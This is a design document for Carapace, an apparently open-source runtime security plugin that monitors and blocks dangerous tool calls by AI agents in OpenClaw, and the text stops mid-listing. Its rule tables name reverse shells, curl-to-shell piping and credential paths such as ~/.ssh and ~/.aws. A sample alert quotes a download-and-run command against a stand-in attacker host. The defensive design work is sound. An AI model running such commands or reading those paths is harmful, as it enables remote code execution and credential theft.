# Carapace — Product & Architecture Design Document

> "Runtime armor for your AI agents."
> Runtime security monitor for AI agents, starting with OpenClaw.

[中文版](./DESIGN.md) · [README (EN)](../README.md) · [README (中文)](../README.zh-CN.md)

---

## 1. Product Vision

### 1.1 Problem Statement

OpenClaw is currently the most popular open-source AI agent framework, but its security model has critical gaps:

- **Overly broad permissions**: Agents can execute shell commands, read/write arbitrary files, and make network requests with no fine-grained control.
- **Malicious skills in the wild**: Cisco research found ~12% of skills on ClawHub (341/2857) are malicious. Third-party skills can exfiltrate data or execute prompt injection without user awareness.
- **CVE-2026-25253 (CVSS 8.8)**: Confirmed RCE attack chain completes in milliseconds.
- **Zero runtime visibility**: OpenClaw's built-in `security audit` is a static, pre-deployment check. Runtime behavior monitoring is completely absent.
- **Single-user trust model**: OpenClaw explicitly does not support adversarial multi-tenant isolation, yet even single users need protection from malicious third-party skills.

### 1.2 Solution

Carapace is an **OpenClaw plugin** that provides runtime security monitoring from inside the agent pipeline. It hooks into OpenClaw's native hook system to observe, analyze, and optionally block dangerous tool calls — without modifying OpenClaw's source code.

### 1.3 Core Differentiation

| Dimension | OpenClaw Built-in | Cisco Skill Scanner | Carapace |
|---|---|---|---|
| Analysis type | Static config audit | Static skill analysis (CLI) | **Runtime behavior monitoring** |
| Deployment | Built-in command | Standalone CLI tool | **Native plugin (one-command install)** |
| Blocking | Tool policy (allow/deny lists) | None (report only) | **Smart blocking via before_tool_call** |
| Behavioral baseline | None | None | **Per-skill behavior profiling** |
| Cross-platform | Yes | Yes | **Yes (pure TypeScript, no OS deps)** |
| Continuous monitoring | No | No | **Yes (real-time hooks + log tailing)** |

### 1.4 What OpenClaw Won't Do (Our Moat)

- **Independent runtime monitoring**: OpenClaw won't monitor its own runtime behavior — it's a conflict of interest (flagging skills as dangerous hurts its ecosystem).
- **Third-party trust scoring**: OpenClaw operates ClawHub and won't objectively evaluate skills in its own marketplace.
- **Behavioral anomaly detection**: Requires continuous observability data that OpenClaw has no infrastructure to collect.
- **Enterprise security integration**: OpenClaw positions itself as a "personal assistant," not an enterprise security tool.

---

## 2. Target Users

### 2.1 Core User Personas

**Persona 1: Security-Conscious Developer ("Sarah")**
- Individual developer using OpenClaw daily for coding
- Installs third-party skills from ClawHub
- Wants to verify skills aren't doing anything malicious
- Technically capable of configuring rules, but wants sane defaults out of the box
- **Core need**: "Alert me if something looks suspicious"

**Persona 2: Tech Lead / Platform Engineer ("Marcus")**
- Manages a 5–15 person dev team, all using OpenClaw
- Responsible for team tool security posture
- Needs compliance audit logs
- Wants to define org-level security policies
- **Core need**: "Give me visibility and control across my team"

**Persona 3: Security Researcher ("Lin")**
- Analyzes vulnerabilities in ClawHub skills
- Needs detailed behavioral traces of skill execution
- Publishes security advisories
- **Core need**: "Show me exactly what this skill did at runtime"

### 2.2 Secondary Personas

**Persona 4: Enterprise Security Team ("DevSecOps")**
- Evaluating whether OpenClaw is safe for enterprise adoption
- Needs SIEM integration, compliance reporting
- Requires tool call audit trails
- **Core need**: "Prove this tool is safe enough for our organization"

---

## 3. Core Use Cases

### UC-1: New Skill Security Scan (MVP)
**Trigger**: User installs a new skill from ClawHub
**Flow**:
1. User runs the skill for the first time
2. Carapace monitors all tool calls in that session via hooks
3. At session end, generates a "first-run report" — tools used, files accessed, network requests made
4. User reviews the report and decides whether to trust the skill
**Value**: Catch malicious skills before they cause damage

### UC-2: Real-Time Dangerous Command Alerts (MVP)
**Trigger**: Any skill/agent tool call matches a dangerous pattern
**Flow**:
1. `before_tool_call` hook fires
2. Carapace rule engine evaluates the call
3. If critical threat (e.g., `curl | bash`, SSH key access): block the call and alert the user
4. If medium/low severity: allow but log and alert
**Value**: Stop the most dangerous attack patterns in real time

### UC-3: Behavioral Anomaly Detection (v0.2)
**Trigger**: A previously trusted skill starts behaving abnormally
**Flow**:
1. Carapace has built a baseline over N sessions (tools used, paths accessed, domains connected)
2. New session shows deviation: skill suddenly accesses `~/.aws/credentials` (never accessed before)
3. Triggers alert with baseline comparison
**Value**: Catch compromised skills or supply chain attacks

### UC-4: Audit Log Export (v0.2)
**Trigger**: User/admin needs records of all tool calls
**Flow**:
1. Carapace continuously logs all tool calls as structured JSON
2. User exports logs for a time range
3. Logs can be imported into SIEM (Splunk, ELK, etc.)
**Value**: Compliance and forensic investigations

### UC-5: Org-Level Policy Enforcement (v0.3)
**Trigger**: Team lead defines security policies
**Flow**:
1. Admin creates policy file (e.g., "no skill may execute shell commands," "only allow access to *.company.com")
2. Policy distributed to all team members' Carapace instances
3. Violations reported centrally
**Value**: Enterprise security governance

---

## 4. Competitive Landscape

### 4.1 Direct Competitors (AI Agent Security)

| Product | Approach | Weakness |
|---|---|---|
| Cisco Skill Scanner | Static analysis CLI for ClawHub skills | No runtime monitoring, no blocking, CLI only |
| Reco AI Agent Security | Cloud SaaS for enterprise AI governance | Expensive, cloud-only, not OpenClaw-specific |
| CrowdStrike AI Protection | Endpoint security with AI agent awareness | Too heavy for individual developers |
| Prompt Armor | Prompt injection detection API | Covers only one attack vector, SaaS dependency |

### 4.2 Indirect Competitors

| Product | Relevance |
|---|---|
| Falco (Kubernetes) | Similar concept (runtime security) but for containers, not AI agents |
| Snyk / Socket.dev | Package security scanning — same model for npm, not skills |
| OpenClaw Tool Policy | Built-in allow/deny list — static, no intelligence |

### 4.3 Our Positioning

**Carapace = Falco for AI agents**: Lightweight, open-source, runtime behavioral security, running as a native plugin — not a heavy external tool.

---

## 5. Open Source Strategy

### 5.1 Fully Open Source (MIT License)

Carapace is a **100% open-source** project with all features freely available to everyone:

- Core rule engine (ExecGuard, PathGuard, NetworkGuard, PromptInjection, DataExfil, BaselineDrift, RateLimiter)
- Real-time alerts (console, webhook, log file)
- JSONL session log tailing
- Per-skill behavioral baselines
- New skill first-run reports
- CLI audit tools
- Dashboard Web UI (event timeline)
- SIEM integration (Splunk, Elasticsearch, Datadog, Syslog connectors)
- Team centralized policy management (inheritance chains, import/export)
- YAML custom rules
- MCP proxy adapter
- LangChain/CrewAI Python bridge

### 5.2 Sustainability

As an open-source project, Carapace relies on community contributions and sponsorship:

- **GitHub Sponsors**: Individual and corporate sponsorship accepted
- **Community contributions**: New rules, adapters, and bug fixes welcome
- **Consulting services**: Optional professional consulting for enterprises needing custom security policies

---

## 6. Technical Architecture

### 6.1 System Overview

```
┌──────────────────────────────────────────────────────────────┐
│                    OpenClaw Gateway (Node.js)                 │
│                                                              │
│  User Message → Agent Pipeline → Tool Selection → Execution  │
│       │         │           │          │                     │
│       ▼         ▼           ▼          ▼                     │
│  ┌────────────────────────────────────────────────────────┐  │
│  │              Carapace Plugin (TypeScript)               │  │
│  │                                                        │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │              Hook Interceptor                     │  │  │
│  │  │  • before_tool_call  (block/modify/observe)      │  │  │
│  │  │  • after_tool_call   (observe results)           │  │  │
│  │  │  • session_start     (init session tracking)     │  │  │
│  │  │  • session_end       (generate session report)   │  │  │
│  │  │  • gateway_start     (startup audit)             │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │              Rule Engine                          │  │  │
│  │  │  • ExecGuard        (dangerous shell commands)   │  │  │
│  │  │  • PathGuard        (sensitive file paths)       │  │  │
│  │  │  • NetworkGuard     (suspicious URLs/domains)    │  │  │
│  │  │  • PromptInjection  (prompt injection detection) │  │  │
│  │  │  • DataExfil        (data exfiltration detection)│  │  │
│  │  │  • RateLimiter      (tool call rate anomaly)     │  │  │
│  │  │  • BaselineDrift    (behavioral drift detection) │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │           Event Processor                        │  │  │
│  │  │  • Dedup         (same event within time window) │  │  │
│  │  │  • Correlation   (related events → incidents)    │  │  │
│  │  │  • Enrichment    (add skill/session context)     │  │  │
│  │  └──────────────┬───────────────────────────────────┘  │  │
│  │                 │                                      │  │
│  │  ┌──────────────▼───────────────────────────────────┐  │  │
│  │  │           Alert Router                           │  │  │
│  │  │  • Console    (colored stderr)                   │  │  │
│  │  │  • Webhook    (Slack/Discord/Teams/custom)       │  │  │
│  │  │  • LogFile    (structured JSON for SIEM)         │  │  │
│  │  │  • HookMsg    (inject into agent conversation)   │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  │                                                        │  │
│  │  ┌──────────────────────────────────────────────────┐  │  │
│  │  │           Data Store (SQLite)                    │  │  │
│  │  │  • Security event log                            │  │  │
│  │  │  • Skill behavioral baselines                    │  │  │
│  │  │  • Session metadata                              │  │  │
│  │  │  • Config cache                                  │  │  │
│  │  └─────────────────────────────────────────────────┘  │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │     Session JSONL Tailer (supplementary data source)   │  │
│  │     ~/.openclaw/sessions/*.jsonl → parse → feed engine │  │
│  └────────────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────────────┘
```

### 6.2 Why Plugin Architecture (Not Sidecar)

| Factor | Plugin (chosen) | Sidecar (rejected) |
|---|---|---|
| Cross-platform | Pure TS, Windows/Mac/Linux | eBPF is Linux-only |
| Install complexity | `openclaw plugins install carapace` | Standalone daemon, needs root |
| Data richness | Full semantic context (skill name, tool params, session) | Raw syscalls only |
| Blocking | `before_tool_call` can reject calls | Can only kill process (too late) |
| Performance | Negligible (in-process) | IPC + eBPF overhead |
| Maintenance | Follow OpenClaw API | Track kernel versions |

### 6.3 Hook Integration Points

OpenClaw provides 24 hooks. Carapace uses 6 of them:

| Hook | Mode | Carapace Usage |
|---|---|---|
| `before_tool_call` | Async sequential (modifiable) | **Primary interception point**. Evaluate rules, optionally block critical threats by returning `{ blocked: true, reason: "..." }` |
| `after_tool_call` | Fire-and-forget | **Result observation**. Log tool results, feed baseline modeler, detect data exfiltration in responses |
| `session_start` | Fire-and-forget | Initialize session tracking, reset session counters |
| `session_end` | Fire-and-forget | Generate session summary report, update skill baselines |
| `gateway_start` | Fire-and-forget | Startup audit: check OpenClaw config for insecure settings, initialize SQLite |
| `gateway_stop` | Fire-and-forget | Flush pending alerts, close database connections |

#### Hook Registration Example

```typescript
// Inside the plugin register() function
api.on("before_tool_call", async (event, ctx) => {
  const ruleCtx: RuleContext = {
    toolName: event.toolName,
    toolParams: event.params,
    toolCallId: event.toolCallId,
    sessionId: ctx.sessionId,
    agentId: ctx.agentId,
    skillName: ctx.currentSkill,
    timestamp: Date.now(),
  };

  const result = ruleEngine.evaluate(ruleCtx);

  if (result.shouldBlock && config.blockOnCritical) {
    alertRouter.send(result.event);
    return { block: true, blockReason: result.event.title };
  }

  if (result.triggered) {
    alertRouter.send(result.event);
  }

  return {}; // allow call to proceed
}, { priority: 100 }); // high priority = runs earlier in chain
```

### 6.4 Dual Data Source Strategy

Carapace uses two complementary data sources:

**Primary: Hook System (Real-time)**
- `before_tool_call` / `after_tool_call` provide structured, typed events
- Can block calls in real time
- Covers all tool calls through the agent pipeline
- Limitation: only captures tool calls, not raw file/network access by skills bypassing the tool system

**Supplementary: JSONL Session Log Tailing**
- `~/.openclaw/sessions/<sessionId>.jsonl` records complete conversation transcripts
- Provides full conversation context for correlation analysis
- Cross-platform via `fs.watch` (Windows, macOS, Linux)
- Use cases: post-hoc analysis, forensic investigation, conversation-level anomaly detection
- Limitation: slight delay (writes happen after tool execution)

The dual-source strategy ensures no blind spots: hooks capture tool calls in real time, JSONL captures everything else.

---

## 7. Data Model

### 7.1 Security Event Schema

```typescript
interface SecurityEvent {
  // Identity
  id: string;                    // "cpc_" + 12 hex characters
  timestamp: number;             // Unix milliseconds

  // Classification
  category: EventCategory;       // exec_danger | path_violation | network_suspect | ...
  severity: Severity;            // critical | high | medium | low | info
  title: string;                 // Human-readable title
  description: string;           // Detailed explanation

  // OpenClaw context
  toolName: string;              // Tool that triggered the event
  toolParams: object;            // Full tool parameters (sanitized)
  toolCallId?: string;           // OpenClaw's tool call ID
  skillName?: string;            // Skill that initiated the call
  sessionId?: string;            // Session ID
  agentId?: string;              // Agent ID

  // Rule metadata
  ruleName: string;              // Rule that triggered
  matchedPattern?: string;       // Specific pattern matched

  // Action taken
  action: "alert" | "blocked";   // Carapace's response
}
```

### 7.2 Skill Baseline Schema

```typescript
interface SkillBaseline {
  skillName: string;
  firstSeen: number;             // Unix milliseconds
  lastSeen: number;              // Unix milliseconds
  sessionCount: number;          // Total observed sessions

  // Behavioral fingerprint
  toolUsage: Map<string, {
    callCount: number;
    avgParamsSize: number;
    lastSeen: number;
  }>;

  pathPatterns: Set<string>;     // File paths accessed (generalized to patterns)
  domainPatterns: Set<string>;   // Network domains connected
  commandPatterns: Set<string>;  // Shell commands executed (normalized)

  // Statistical profile
  avgToolCallsPerSession: number;
  stdDevToolCalls: number;
  maxToolCallsObserved: number;
}
```

### 7.3 SQLite Table Schema

```sql
-- Security events (append-only log)
CREATE TABLE events (
  id TEXT PRIMARY KEY,
  timestamp INTEGER NOT NULL,
  category TEXT NOT NULL,
  severity TEXT NOT NULL,
  title TEXT NOT NULL,
  description TEXT,
  tool_name TEXT,
  skill_name TEXT,
  session_id TEXT,
  agent_id TEXT,
  rule_name TEXT,
  action TEXT NOT NULL,
  details_json TEXT,        -- Full event details (JSON)
  created_at INTEGER DEFAULT (strftime('%s', 'now') * 1000)
);

CREATE INDEX idx_events_timestamp ON events(timestamp);
CREATE INDEX idx_events_severity ON events(severity);
CREATE INDEX idx_events_skill ON events(skill_name);

-- Skill baselines (incrementally updated)
CREATE TABLE skill_baselines (
  skill_name TEXT PRIMARY KEY,
  first_seen INTEGER NOT NULL,
  last_seen INTEGER NOT NULL,
  session_count INTEGER DEFAULT 0,
  tool_usage_json TEXT,     -- Serialized Map
  path_patterns_json TEXT,  -- Serialized Set
  domain_patterns_json TEXT,
  command_patterns_json TEXT,
  avg_calls_per_session REAL DEFAULT 0,
  std_dev_calls REAL DEFAULT 0,
  max_calls_observed INTEGER DEFAULT 0
);

-- Session tracking
CREATE TABLE sessions (
  session_id TEXT PRIMARY KEY,
  agent_id TEXT,
  started_at INTEGER NOT NULL,
  ended_at INTEGER,
  tool_call_count INTEGER DEFAULT 0,
  event_count INTEGER DEFAULT 0,
  skills_used_json TEXT
);
```

---

## 8. Rule Engine Design

### 8.1 Rule Evaluation Flow

```
Tool Call Event
     │
     ▼
┌──────────┐ ┌──────────┐ ┌────────────┐ ┌─────────────────┐
│ExecGuard │▶│PathGuard │▶│NetworkGuard│▶│PromptInjection  │
└──────────┘ └──────────┘ └────────────┘ └────────┬────────┘
                                                   ▼
             ┌─────────────┐ ┌───────────┐ ┌──────────────┐
             │BaselineDrift │◀│RateLimiter│◀│  DataExfil   │
             └──────┬──────┘ └───────────┘ └──────────────┘
       │
       ▼
  Merge Results (highest severity wins)
       │
       ▼
  Event Processor (dedup + enrichment)
       │
       ▼
  Alert Router (dispatch to sinks)
```

### 8.2 Rule Types

| Rule | Category | Triggers | Default Action |
|---|---|---|---|
| **ExecGuard** | exec_danger | Dangerous shell command patterns (curl\|sh, base64\|bash, reverse shells, encoded PowerShell) | Block critical, alert others |
| **PathGuard** | path_violation | Sensitive file access (~/.ssh/, ~/.aws/, browser data, crypto wallets, .env files) | Block critical, alert others |
| **NetworkGuard** | network_suspect | Suspicious URLs (paste services, file sharing, webhook catchers, .onion, raw IP) | Block .onion, alert others |
| **RateLimiter** | rate_anomaly | Tool call rate exceeds threshold (default 60/min) or sudden spike (3x baseline) | Alert only |
| **PromptInjection** | prompt_injection | Prompt injection patterns detected in tool parameters (instruction override, role hijacking, encoded injection) | Block critical, alert others |
| **DataExfil** | data_exfil | Data exfiltration patterns detected (sensitive data sent via network/file/clipboard) | Block critical, alert others |
| **BaselineDrift** | baseline_drift | Skill accesses new tools/paths/domains not in its learned profile | Alert only |

### 8.3 Rule Priority & Conflict Resolution

Rules evaluate in sequence. If the same tool call triggers multiple rules:
1. **Highest severity wins** for alerting
2. **Any shouldBlock=true** → block the call (logical OR)
3. **All events are logged**, unaffected by dedup

### 8.4 Custom Rules API (v0.2)

Users can define custom rules in Carapace config:

```yaml
# ~/.openclaw/carapace.yml
customRules:
  - name: "no-production-db"
    description: "Block connections to production database"
    match:
      toolName: ["exec", "bash"]
      paramContains: "prod-db.company.com"
    severity: critical
    action: block

  - name: "limit-file-writes"
    description: "Alert on writes outside project directory"
    match:
      toolName: ["file_write", "write"]
      paramNotMatch:
        path: "^/home/user/projects/"
    severity: medium
    action: alert
```

---

## 9. Alert System Design

### 9.1 Alert Channels

| Channel | Config | Format | Use Case |
|---|---|---|---|
| **Console** | (always on) | Colored stderr output | Developer terminal |
| **Webhook** | `alertWebhook` | JSON POST to URL | Slack, Discord, Teams |
| **LogFile** | `logFile` | JSON Lines (one event per line) | SIEM ingestion, audit trail |
| **HookMessage** | (always on for critical) | Warning injected into agent conversation | User sees alert in chat |

### 9.2 Alert Deduplication

Same rule + same tool + same params within a **5-minute window** → suppress duplicate alerts.
Implementation: LRU cache of `hash(ruleName + toolName + paramHash)` with TTL.

### 9.3 Alert Escalation

```
First occurrence          → Alert at detected severity
3 times within 10 min     → Severity escalated by one level
10 times within 10 min    → Force CRITICAL + recommend enabling blocking
```

### 9.4 Webhook Payload Format

```json
{
  "source": "carapace",
  "version": "0.10.3",
  "event": {
    "id": "cpc_a1b2c3d4e5f6",
    "timestamp": "2026-03-09T20:30:00Z",
    "severity": "critical",
    "category": "exec_danger",
    "title": "Remote code execution: curl piped to shell",
    "description": "Skill 'calendar-sync' attempted to execute: curl https://evil.com/payload | bash",
    "toolName": "exec",
    "skillName": "calendar-sync",
    "action": "blocked"
  }
}
```

---

## 10. Behavioral Baseline Design

### 10.1 Learning Strategy

**Cold Start (first 20 calls per skill)**:
- Only hard rules active (ExecGuard, PathGuard, NetworkGuard, PromptInjection, DataExfil)
- All tool calls logged to build initial baseline
- No anomaly alerts triggered (false positive rate too high)
- After 20 calls: baseline "freezes," BaselineDrift activates

**Warm-Up Phase (after learning threshold)**:
- BaselineDrift compares each tool call against the skill's profile
- New tools/paths/domains → alert as `baseline_drift`
- Baseline continues slow updates (exponential moving average)
- Major changes require re-learning (user can trigger manually)

### 10.2 Path Generalization

Raw file paths are generalized to patterns for baseline matching:
- `/home/user/projects/myapp/src/index.ts` → `/home/user/projects/*/src/*`
- `/tmp/openclaw-12345/scratch.txt` → `/tmp/openclaw-*/scratch.*`

This prevents false positives from temporary paths while catching genuinely new access patterns.

### 10.3 False Positive Management

Users can dismiss false positives, creating an **exception**:
```bash
carapace dismiss <event-id>              # dismiss a single event
carapace trust <skill-name> --tool exec  # trust a skill with a specific tool
carapace trust <skill-name> --path "~/.config/myapp/*"  # trust a specific path pattern
```

Exceptions are stored in SQLite and checked before alerting.

---

## 11. Configuration Design

### 11.1 Configuration Sources (Priority High to Low)

1. **CLI arguments** (highest priority)
2. **Environment variables** (`CARAPACE_*`)
3. **Project config** (`.carapace.yml` in working directory)
4. **User config** (`~/.openclaw/carapace.yml`)
5. **Defaults** (lowest priority)

### 11.2 Full Configuration Schema

```yaml
# ~/.openclaw/carapace.yml

# Alert channels
alertWebhook: "https://hooks.slack.com/services/T00/B00/xxx"
logFile: "~/.openclaw/carapace/events.jsonl"

# Blocking behavior
blockOnCritical: false      # true = block critical threats (default: alert only)

# Rate limiting
maxToolCallsPerMinute: 60   # Tool call rate alert threshold

# Behavioral baselines
enableBaseline: true        # Enable behavior learning and anomaly detection
baselineLearningPeriod: 5   # Sessions before baseline activates

# Custom sensitive paths (appended to default list)
sensitivePathPatterns:
  - "/home/user/.myapp/secrets/*"
  - "*.credential"

# Custom blocked domains (appended to default list)
blockedDomains:
  - "competitor.com"
  - "*.ru"

# Trusted skills (bypass baseline alerts)
trustedSkills:
  - "official/file-manager"
  - "official/git"

# Custom rules
customRules: []

# Verbose logging
debug: false
```

---

## 12. CLI Commands

```bash
# Status and info
carapace status              # Show Carapace status, active rules, recent events
carapace config              # Show effective configuration

# Event management
carapace events              # List recent security events
carapace events --severity critical --since 24h
carapace events --skill "calendar-sync"
carapace events --export csv > events.csv

# Skill trust management
carapace skills              # List all observed skills with trust scores
carapace skills inspect <name>  # Show detailed behavioral profile
carapace trust <skill> [--tool X] [--path Y] [--domain Z]
carapace untrust <skill>

# Initialization and configuration
carapace init                # Initialize Carapace configuration file
carapace setup               # Interactive security policy setup wizard

# Manual operations
carapace scan                # One-time audit of current OpenClaw config
carapace report <session-id> # Generate detailed report for a session
carapace baseline reset <skill>  # Reset a skill's baseline

# Demo and monitoring
carapace demo                # Run built-in demo scenarios
carapace dashboard           # Launch security event dashboard
carapace test-rule <rule>    # Test a single rule

# Dismissal management
carapace dismiss <event-id>
carapace dismissals list
carapace dismissals clear
```

---

## 13. MVP Delivery Plan

### Phase 0: Foundation (Week 1)

**Deliverables:**
- [x] Project scaffolding: package.json, tsconfig, directory structure
- [x] Type definitions (SecurityEvent, RuleContext, CarapaceConfig)
- [x] Plugin entry and hook registration skeleton
- [x] SQLite initialization and schema migration
- [x] Unit test framework (vitest)

**Done Criteria:** Plugin loads in OpenClaw without errors, hooks registered

### Phase 1: Core Rules (Week 2)

**Deliverables:**
- [x] ExecGuard: 99 dangerous command patterns
- [x] PathGuard: 47 sensitive path patterns (Windows, macOS, Linux)
- [x] NetworkGuard: 36 suspicious domain patterns (20 categories)
- [x] Rule engine with priority and conflict resolution
- [x] Console alerting (colored stderr)

**Done Criteria:** Three rules detect known attack patterns with >95% accuracy in unit tests

### Phase 2: Hook Integration (Week 3)

**Deliverables:**
- [x] `before_tool_call` hook with blocking support
- [x] `after_tool_call` hook for result observation
- [x] `session_start` / `session_end` hooks for session tracking
- [x] Event processor with deduplication
- [x] Webhook alerting (Slack/Discord format)

**Done Criteria:** End-to-end test: malicious skill → detection → alert → block (with blockOnCritical enabled)

### Phase 3: Behavioral Baselines (Weeks 4–5)

**Deliverables:**
- [x] JSONL session log tailer
- [x] Per-skill baseline modeler
- [x] RateLimiter (rate anomaly)
- [x] BaselineDrift (drift detection)
- [x] First-run report generator
- [x] `carapace skills` CLI command

**Done Criteria:** Baseline established after 20 calls, can detect new tool/path/domain access

### Phase 4: Polish & Release (Week 6)

**Deliverables:**
- [x] README (install guide and screenshots)
- [x] Configuration docs
- [x] npm package publishing
- [x] GitHub Actions CI/CD
- [x] ClawHub listing (if applicable)
- [x] Launch blog post draft

**Done Criteria:** `openclaw plugins install carapace` works end-to-end

---

## 14. Risk Analysis

| Risk | Probability | Impact | Mitigation |
|---|---|---|---|
| OpenClaw changes hook API | Medium | High | Pin API version, monitor OpenClaw releases, maintain compatibility layer |
| High false positive rate | High | Medium | Conservative defaults, easy dismiss UX, baseline learning reduces FP over time |
| Performance overhead | Low | High | Async evaluation, LRU caching, rule short-circuiting |
| OpenClaw ships competing feature | Medium | High | Expand to multi-framework support (LangChain, CrewAI adapter layer) |
| JSONL format changes | Medium | Low | Supplementary data source only; hooks are primary |
| User trust resistance ("another thing monitoring me") | Medium | Medium | Open source, pure local processing, no telemetry, clear privacy policy |

---

## 15. Success Metrics

| Metric | Target (Month 3) | Target (Month 6) |
|---|---|---|
| npm installs | 1,000 | 5,000 |
| GitHub stars | 200 | 1,000 |
| Daily active users (telemetry opt-in) | 100 | 500 |
| Critical threats blocked | Track count | Track count |
| False positive rate | <20% | <5% |
| Avg rule evaluation time | <5ms | <2ms |
| Plugin load overhead | <50ms | <30ms |

---

## 16. Multi-Framework Adapter Architecture

### 16.1 Why Multi-Framework Support

Binding exclusively to OpenClaw is a strategic risk: if OpenClaw patches its security gap, or market share shifts to other frameworks, Carapace loses its value. The goal is to make Carapace a **universal runtime security layer for AI agents**, with OpenClaw as the first adapter.

Target frameworks (by priority):
1. **OpenClaw** — First adapter (MVP). Largest open-source agent community.
2. **LangChain / LangGraph** — Python ecosystem, massive user base. Uses "callbacks" for hooks.
3. **CrewAI** — Multi-agent framework. Uses "task callbacks" and "agent callbacks."
4. **AutoGen (Microsoft)** — Uses "hook" registration on agents.
5. **Claude Code / Agent SDK** — Anthropic's agent framework. Hook system similar to OpenClaw.
6. **Custom MCP Servers** — Any Model Context Protocol server can be wrapped.

### 16.2 Core / Adapter Layering

```
┌─────────────────────────────────────────────────────────────┐
│                    @carapace/core                            │
│                                                             │
│  ┌───────────────┐  ┌───────────────┐  ┌────────────────┐  │
│  │  Rule Engine   │  │  Event        │  │  Alert Router  │  │
│  │  (ExecGuard,   │  │  Processor    │  │  (console,     │  │
│  │   PathGuard,   │  │  (dedup,      │  │   webhook,     │  │
│  │   NetworkGuard │  │   enrichment, │  │   logfile)     │  │
│  │   RateLimiter, │  │   correlation)│  │               │  │
│  │   Baseline)    │  │               │  │               │  │
│  └───────┬───────┘  └───────┬───────┘  └───────┬────────┘  │
│          │                  │                   │           │
│  ┌───────▼──────────────────▼───────────────────▼────────┐  │
│  │              Unified Event Bus                         │  │
│  │   emit(ToolCallEvent) → evaluate → alert              │  │
│  └───────────────────────▲───────────────────────────────┘  │
│                          │                                  │
│  ┌───────────────────────┴───────────────────────────────┐  │
│  │              Adapter Interface (abstract)              │  │
│  │                                                       │  │
│  │  interface FrameworkAdapter {                          │  │
│  │    name: string;                                      │  │
│  │    version: string;                                   │  │
│  │    initialize(config: CarapaceConfig): Promise<void>; │  │
│  │    normalizeEvent(raw: unknown): ToolCallEvent;       │  │
│  │    registerHooks(bus: EventBus): Promise<void>;       │  │
│  │    blockCall?(callId: string, reason: string): void;  │  │
│  │    shutdown(): Promise<void>;                         │  │
│  │  }                                                    │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘

Adapters (separate packages):

┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ @carapace/       │  │ @carapace/       │  │ @carapace/       │
│ adapter-openclaw │  │ adapter-langchain│  │ adapter-crewai   │
│                  │  │                  │  │                  │
│ • OpenClaw plugin│  │ • LangChain      │  │ • CrewAI         │
│ • Hook API       │  │   CallbackHandler│  │   task/agent     │
│ • JSONL tailer   │  │ • Python bridge  │  │   callbacks      │
│ • before/after   │  │   (stdio IPC)    │  │ • Python bridge  │
│   tool_call      │  │ • Blocking       │  │                  │
└──────────────────┘  └──────────────────┘  └──────────────────┘

┌──────────────────┐  ┌──────────────────┐
│ @carapace/       │  │ @carapace/       │
│ adapter-autogen  │  │ adapter-mcp      │
│                  │  │                  │
│ • AutoGen hook   │  │ • MCP protocol   │
│   registration   │  │   interceptor    │
│ • Python bridge  │  │ • Universal,     │
│                  │  │   any MCP server │
└──────────────────┘  └──────────────────┘
```

### 16.3 Standardized Event Model

All adapters convert framework-specific events to a unified `ToolCallEvent`:

```typescript
// @carapace/core
interface ToolCallEvent {
  // Framework-agnostic fields
  id: string;                    // Unique call ID
  timestamp: number;
  framework: string;             // "openclaw" | "langchain" | "crewai" | ...
  phase: "before" | "after";     // Pre- or post-execution

  // Tool call data (standardized across frameworks)
  toolName: string;              // Normalized tool name
  toolParams: Record<string, unknown>;
  toolResult?: unknown;          // "after" phase only

  // Agent context (best-effort, varies by framework)
  agentId?: string;
  sessionId?: string;
  skillName?: string;            // OpenClaw: skill name. LangChain: chain name.
  conversationId?: string;

  // Raw event (for framework-specific rules)
  rawEvent: unknown;
}
```

### 16.4 Python Bridge for Non-JS Frameworks

LangChain, CrewAI, and AutoGen are Python frameworks. Carapace core is TypeScript. Bridging is done via **stdio IPC**:

```
┌─────────────────────┐    stdio (JSON lines)    ┌──────────────────────┐
│  Python process      │ ◄──────────────────────► │  Carapace core       │
│                      │                          │  (Node.js)           │
│  • LangChain app     │   → ToolCallEvent JSON   │                      │
│  • carapace-py shim  │   ← BlockDecision JSON   │  • Rule engine       │
│    (pip install)     │                          │  • Alert router      │
└─────────────────────┘                          └──────────────────────┘
```

**carapace-py** is a lightweight Python package:
```python
# pip install carapace-agent
from carapace import CarapaceMonitor

# LangChain integration
from langchain.callbacks import BaseCallbackHandler

class CarapaceCallback(BaseCallbackHandler):
    def __init__(self):
        self.monitor = CarapaceMonitor()  # Starts Node.js core process

    def on_tool_start(self, tool, input_str, **kwargs):
        decision = self.monitor.check_tool_call(
            tool_name=tool.name,
            params={"input": input_str},
            framework="langchain"
        )
        if decision.blocked:
            raise SecurityBlockedError(decision.reason)

    def on_tool_end(self, output, **kwargs):
        self.monitor.report_tool_result(output)
```

### 16.5 MCP Protocol Adapter (Universal)

For any MCP-based agent, Carapace can act as an **MCP proxy**:

```
Agent ──► Carapace MCP Proxy ──► Actual MCP Server
              │
              ├─ Inspect tool calls
              ├─ Apply rules
              ├─ Block when needed
              └─ Log everything
```

This is the most universal approach — no modifications needed on either side. Works with any MCP client/server pair. The proxy intercepts `tools/call` requests, evaluates, and forwards or blocks.

### 16.6 Package Structure

```
carapace/
├── packages/
│   ├── core/                    # @carapace/core
│   │   ├── src/
│   │   │   ├── rules/          # All rule implementations
│   │   │   ├── engine.ts       # Rule evaluation engine
│   │   │   ├── events.ts       # Event bus
│   │   │   ├── alerter.ts      # Alert router
│   │   │   ├── baseline.ts     # Behavioral baselines
│   │   │   └── store.ts        # SQLite persistence
│   │   └── package.json
│   │
│   ├── adapter-openclaw/        # @carapace/adapter-openclaw
│   │   ├── src/
│   │   │   ├── index.ts        # OpenClaw plugin entry
│   │   │   ├── hooks.ts        # Hook registration
│   │   │   └── tailer.ts       # JSONL session log tailer
│   │   └── package.json
│   │
│   ├── adapter-langchain/       # @carapace/adapter-langchain
│   │   ├── python/             # carapace-py package
│   │   └── src/                # Node.js bridge server
│   │
│   ├── adapter-mcp/            # @carapace/adapter-mcp
│   │   ├── src/
